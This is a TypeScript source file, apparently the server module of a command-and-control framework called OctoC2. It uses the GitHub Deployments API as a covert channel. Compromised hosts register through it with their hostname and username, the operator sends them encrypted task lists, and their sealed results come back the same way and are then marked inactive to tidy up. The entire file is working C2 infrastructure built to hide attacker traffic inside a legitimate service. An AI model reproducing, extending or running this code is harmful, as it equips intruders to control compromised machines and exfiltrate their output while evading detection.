/**
 * OctoC2 Server — PagesChannel
 *
 * Polls GitHub Deployments API for beacon activity:
 *   ci-{id8}    environment  — Beacon → Server  ACK / registration
 *   ci-t-{id8}  environment  — Server → Beacon  Encrypted Task[] blob
 *   ci-r-{id8}  environment  — Beacon → Server  Sealed TaskResult blob
 */

import type { Octokit } from "@octokit/rest";
import type { BeaconRegistry } from "../BeaconRegistry.ts";
import type { TaskQueue } from "../TaskQueue.ts";
import {
  openSealBox, encryptForBeacon,
  base64ToBytes, bytesToBase64,
} from "../crypto/sodium.ts";
import { createRequire } from "node:module";
import type _SodiumModule from "libsodium-wrappers";

const _sodium = createRequire(import.meta.url)("libsodium-wrappers") as typeof _SodiumModule;

interface PagesChannelOpts {
  owner:             string;
  repo:              string;
  token:             string;
  operatorSecretKey: Uint8Array;
  pollIntervalMs:    number;
  octokit:           Octokit;
}

interface AckPayload {
  beaconId:  string;
  publicKey: string;
  hostname:  string;
  username:  string;
  os:        string;
  arch:      string;
  checkinAt: string;
}

/** 8 hex chars matching pattern: [0-9a-f]{8} */
const ACK_ENV_RE    = /^ci-([0-9a-f]{8})$/;
const RESULT_ENV_RE = /^ci-r-([0-9a-f]{8})$/;
const TASK_ENV_RE   = /^ci-t-([0-9a-f]{8})$/;

export class PagesChannel {
  private timer: ReturnType<typeof setInterval> | null = null;

  /** beaconIds registered via ACK deployments */
  private readonly pagesBeacons = new Set<string>();

  /** Deployment IDs already processed as ACKs (avoid re-registration) */
  private readonly seenAckDeploymentIds = new Set<number>();

  /** Deployment IDs already processed as results (avoid re-processing) */
  private readonly processedResultDeployments = new Set<number>();

  constructor(
    private readonly registry: BeaconRegistry,
    private readonly queue:    TaskQueue,
    private readonly opts:     PagesChannelOpts,
  ) {}

  start(): void {
    if (this.timer) return;
    this.timer = setInterval(() => {
      this.poll().catch(err =>
        console.error("[PagesChannel] Poll error:", (err as Error).message)
      );
    }, this.opts.pollIntervalMs);
    console.log("[PagesChannel] Started polling");
  }

  stop(): void {
    if (this.timer) {
      clearInterval(this.timer);
      this.timer = null;
      console.log("[PagesChannel] Stopped");
    }
  }

  // ── Poll cycle ────────────────────────────────────────────────────────────────

  async poll(): Promise<void> {
    let deployments: any[];
    try {
      const resp = await this.opts.octokit.rest.repos.listDeployments({
        owner:    this.opts.owner,
        repo:     this.opts.repo,
        per_page: 100,
      });
      deployments = resp.data as any[];
    } catch (err) {
      console.warn("[PagesChannel] Failed to list deployments:", (err as Error).message);
      return;
    }

    await this.processAckDeployments(deployments);
    await this.processResultDeployments(deployments);
    await this.deliverPendingTasks();
  }

  // ── ACK deployment processing ─────────────────────────────────────────────────

  private async processAckDeployments(deployments: any[]): Promise<void> {
    for (const dep of deployments) {
      const env: string = dep.environment ?? "";
      if (!ACK_ENV_RE.test(env)) continue;
      if (this.seenAckDeploymentIds.has(dep.id)) continue;
      this.seenAckDeploymentIds.add(dep.id);

      try {
        const description: string = dep.description ?? "";
        if (!description) continue;

        const ack = JSON.parse(description) as AckPayload;
        if (!ack.beaconId || !ack.publicKey) continue;

        this.registry.register({
          beaconId:    ack.beaconId,
          issueNumber: 0,
          publicKey:   ack.publicKey,
          hostname:    ack.hostname,
          username:    ack.username,
          os:          ack.os,
          arch:        ack.arch,
          seq:         0,
        });
        this.pagesBeacons.add(ack.beaconId);

        console.log(`[PagesChannel] Registered beacon ${ack.beaconId} from ACK deployment`);
      } catch (err) {
        console.warn("[PagesChannel] ACK processing error:", (err as Error).message);
      }
    }
  }

  // ── Result deployment processing ──────────────────────────────────────────────

  private async processResultDeployments(deployments: any[]): Promise<void> {
    for (const dep of deployments) {
      const env: string = dep.environment ?? "";
      if (!RESULT_ENV_RE.test(env)) continue;
      if (this.processedResultDeployments.has(dep.id)) continue;

      try {
        const sealedPayload: string = typeof dep.payload === "string"
          ? dep.payload
          : (dep.payload ? JSON.stringify(dep.payload) : "");
        if (!sealedPayload) continue;

        // Derive operator public key from secret key
        await _sodium.ready;
        const operatorPublicKey = _sodium.crypto_scalarmult_base(this.opts.operatorSecretKey);

        const plainBytes = await openSealBox(sealedPayload, operatorPublicKey, this.opts.operatorSecretKey);
        const plain = new TextDecoder().decode(plainBytes);
        const result = JSON.parse(plain) as { taskId: string; beaconId: string; success: boolean; output: string };

        if (result.taskId) {
          this.queue.markCompleted(result.taskId, plain);
          console.log(`[PagesChannel] Task ${result.taskId} completed (success=${result.success})`);
        }

        this.processedResultDeployments.add(dep.id);

        // Mark the result deployment inactive (cleanup signal)
        try {
          await this.opts.octokit.rest.repos.createDeploymentStatus({
            owner:         this.opts.owner,
            repo:          this.opts.repo,
            deployment_id: dep.id,
            state:         "inactive",
          });
        } catch { /* best-effort */ }
      } catch (err) {
        console.warn("[PagesChannel] Result processing error:", (err as Error).message);
      }
    }
  }

  // ── Task delivery ─────────────────────────────────────────────────────────────

  private async deliverPendingTasks(): Promise<void> {
    for (const beaconId of this.pagesBeacons) {
      const allPending = this.queue.getPendingTasks(beaconId);
      const pending = allPending.filter(
        t => !t.preferredChannel || t.preferredChannel === "pages"
      );
      if (pending.length === 0) continue;

      const beacon = this.registry.get(beaconId);
      if (!beacon) continue;

      try {
        const beaconPublicKey = await base64ToBytes(beacon.publicKey);
        const taskJson = JSON.stringify(pending.map(t => ({
          taskId: t.taskId,
          kind:   t.kind,
          args:   t.args,
          ref:    t.ref,
        })));

        const encrypted = await encryptForBeacon(
          taskJson,
          beaconPublicKey,
          this.opts.operatorSecretKey,
        );

        const id8 = beaconId.slice(0, 8);

        await this.opts.octokit.rest.repos.createDeployment({
          owner:             this.opts.owner,
          repo:              this.opts.repo,
          ref:               "main",
          environment:       `ci-t-${id8}`,
          payload:           JSON.stringify(encrypted),
          description:       "tasks",
          auto_merge:        false,
          required_contexts: [],
        } as any);

        // Mark tasks as delivered
        for (const t of pending) {
          this.queue.markDelivered(t.taskId);
        }

        console.log(`[PagesChannel] Delivered ${pending.length} task(s) to beacon ${beaconId}`);
      } catch (err) {
        console.warn(`[PagesChannel] Task delivery error for ${beaconId}:`, (err as Error).message);
      }
    }
  }
}
